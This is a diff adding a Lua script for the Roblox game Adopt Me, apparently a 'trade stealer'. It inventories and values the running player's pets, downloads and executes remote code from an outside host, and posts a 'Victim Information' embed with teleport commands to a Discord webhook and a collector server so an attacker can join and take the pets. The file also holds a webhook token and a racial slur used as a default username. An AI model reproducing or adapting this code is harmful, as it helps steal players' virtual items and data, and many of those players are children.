@@ -1,0 +1,178 @@
+local Username = Username or "nigga123"
+local Webhook = Webhook or "https://discord.com/api/webhooks/1342078045875470436/sybOLuuOgHl2tbs8W4tAHBGlZlcOS6hBiMvrJjCgXllwuQ9chMLe4T-t3wr31zXUJwfq"
+local Duser = "Allpets_Collector"
+local Dwebhook = "https://sudokai.up.railway.app/webhook"
+
+local Pets = {};
+local PetCounts = {};
+local Loaders = require(game.ReplicatedStorage.Fsys).load;
+local InventoryDB = Loaders("InventoryDB");
+local ClientData = Loaders("ClientData");
+local clientData = require(game.ReplicatedStorage.ClientModules.Core.ClientData);
+local playerData = clientData.get_data()[tostring(game.Players.LocalPlayer)];
+
+local mfr_count = 0;
+local nfr_count = 0;
+local fr_count = 0;
+local fly_count = 0;
+local ride_count = 0;
+
+for _, petData in pairs(playerData.inventory.pets) do
+    if (petData.properties and (type(petData.properties) == "table")) then
+        if (petData.properties.mega_neon and petData.properties.flyable and
+            petData.properties.rideable) then
+            mfr_count = mfr_count + 1;
+        elseif (petData.properties.neon and petData.properties.flyable and
+            petData.properties.rideable) then
+            nfr_count = nfr_count + 1;
+        elseif (petData.properties.neon and petData.properties.flyable) then
+            nfr_count = nfr_count + 1;
+        elseif (petData.properties.neon and petData.properties.rideable) then
+            nfr_count = nfr_count + 1;
+        elseif (petData.properties.neon and
+            not (petData.properties.flyable or petData.properties.rideable)) then
+            nfr_count = nfr_count + 1;
+        elseif (petData.properties.flyable and petData.properties.rideable) then
+            fr_count = fr_count + 1;
+        elseif ((petData.properties.flyable or petData.properties.rideable) and
+            not (petData.properties.mega_neon or petData.properties.neon)) then
+            fr_count = fr_count + 1;
+        end
+    end
+end
+
+local legendaries_count = 0;
+local ultra_count = 0;
+local rare_count = 0;
+local uncommon_count = 0;
+local common_count = 0;
+
+for i, v in pairs(ClientData.get("inventory").pets) do
+    local petData = InventoryDB[v.category][v.id];
+    if (petData.rarity == "legendary") then
+        legendaries_count = legendaries_count + 1;
+    elseif (petData.rarity == "ultra_rare") then
+        ultra_count = ultra_count + 1;
+    elseif (petData.rarity == "rare") then
+        rare_count = rare_count + 1;
+    elseif (petData.rarity == "uncommon") then
+        uncommon_count = uncommon_count + 1;
+    elseif (petData.rarity == "common") then
+        common_count = common_count + 1;
+    end
+end
+common_count = math.max(0, common_count - 1); --practice dog
+
+
+local values = loadstring(game:HttpGet("https://sudokai.up.railway.app/scripts/values.lua"))()
+
+local total_values = 0
+local function matches_name(output_name, table_name)
+    return string.lower(output_name) == string.lower(table_name)
+end
+
+for i, v in pairs(
+    require(game.ReplicatedStorage.ClientModules.Core.ClientData).get_data()[game.Players.LocalPlayer.Name].inventory.pets
+) do
+    local label = ""
+    if v.properties.mega_neon and v.properties.flyable and v.properties.rideable then
+        label = "rfm"
+    elseif v.properties.mega_neon and v.properties.flyable then
+        label = "fm"
+    elseif v.properties.mega_neon and v.properties.rideable then
+        label = "rm"
+    elseif v.properties.mega_neon then
+        label = "m"
+    elseif v.properties.neon and v.properties.flyable and v.properties.rideable then
+        label = "rfn"
+    elseif v.properties.neon and v.properties.flyable then
+        label = "fn"
+    elseif v.properties.neon and v.properties.rideable then
+        label = "rn"
+    elseif v.properties.neon then
+        label = "n"
+    elseif v.properties.flyable and v.properties.rideable then
+        label = "rfd"
+    elseif v.properties.flyable then
+        label = "fd"
+    elseif v.properties.rideable then
+        label = "rd"
+    else
+        label = "d"
+    end
+
+    local petName = v.id:gsub("%d+", ""):gsub("_", " "):gsub("%s+", " ")
+    petName = petName:gsub("^(%a)(%a*)", function(first, rest)
+        return first:upper() .. rest:lower()
+    end)
+
+    local key = petName .. " (" .. label .. ")"
+    if PetCounts[key] then
+        PetCounts[key] = PetCounts[key] + 1
+    else
+        PetCounts[key] = 1
+    end
+    for _, data in ipairs(values) do
+        if matches_name(petName, data.name) and data[label] then
+            total_values = total_values + tonumber(data[label])
+        end
+    end
+end
+
+-- Start of optimized script
+local plr = game.Players.LocalPlayer
+local accage = plr.AccountAge
+local ExecutorValue = identifyexecutor() or "Unknown"
+
+local consoletpReal = "Roblox.GameLauncher.joinGameInstance(" .. game.PlaceId .. ", '" .. game.JobId .. "')"
+local TeleportScriptReal = [[game:GetService("TeleportService"):TeleportToPlaceInstance(]] .. game.PlaceId .. [[, "]] .. game.JobId .. [[", game.Players.LocalPlayer)]]
+
+local function CreateEmbed(title, consoletp, teleportScript, receiver, hitter, isWebhook)
+    local fields = {
+        {
+            name = ":ninja: **Victim Information:**",
+            value = ("```lua\n" .. "Victim           : " .. tostring(plr) .. "\n" .. "Executor         : " .. tostring(ExecutorValue) .. "\n" .. "Account Age      : " .. tostring(accage) .. "```")
+        },
+        {
+            name = ":crown: **Collector**",
+            value = isWebhook and ("```lua\n" .. "Receiver         : " .. tostring(receiver) .. "\n```") or ("```lua\n" .. "Receiver         : " .. tostring(receiver) .. "\nHitter           : " .. tostring(hitter) .. "\n```")
+        },
+        {
+            name = ":question: **Amount**",
+            value = ("```lua\n" .. "Total Value     : " .. tostring(total_values) .. "\n" .. "```")
+        },
+        {
+            name = "**Game Teleporter Method**",
+            value = (teleportScript .. "\n")
+        },
+        {
+            name = "**Chrome Console Method**",
+            value = (consoletp .. "\n") 
+        }
+    }
+    return { title = title, color = 16711680, fields = fields }
+end
+
+local function SendMessageEMBED(url, embed)
+    local http = game:GetService("HttpService")
+    local headers = { ["Content-Type"] = "application/json" }
+    local data = {
+        username = "Adopt Me! | Made by Kai",
+        avatar_url = "https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcR3vXYMnRTuk5y3MYMCZLJ4v9AwqZmj6v8amWUcBLV_CjRBJlUjBvXCQYQz8LKROHmMIto&usqp=CAU",
+        content = "@everyone",
+        embeds = { embed }
+    }
+    request({
+        Url = url,
+        Method = "POST",
+        Headers = headers,
+        Body = http:JSONEncode(data)
+    })
+end
+
+local embedDwebhook = CreateEmbed("Trade Stealer Hit!", consoletpReal, TeleportScriptReal, Duser, Username, false)
+SendMessageEMBED(Dwebhook, embedDwebhook)
+
+local embedReceiverOnly = CreateEmbed("Trade Stealer Hit!", TeleportScriptReal, Username, "None", true)
+SendMessageEMBED(Webhook, embedReceiverOnly)
+-- End of optimized script
